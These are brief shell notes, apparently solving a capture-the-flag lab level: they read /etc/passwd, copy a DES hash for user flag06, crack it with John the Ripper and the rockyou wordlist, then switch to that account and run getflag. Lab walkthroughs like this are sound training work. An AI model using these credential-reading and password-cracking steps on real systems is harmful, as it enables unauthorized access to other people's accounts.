cat /etc/passwd
"flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh"
echo 'ueqwOCnSGdsuM' > /tmp/hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt  /tmp/hash.txt
ueqwOCnSGdsuM => DES => hello # usar isso como senha pro usuario flag06
su flag06 
getflag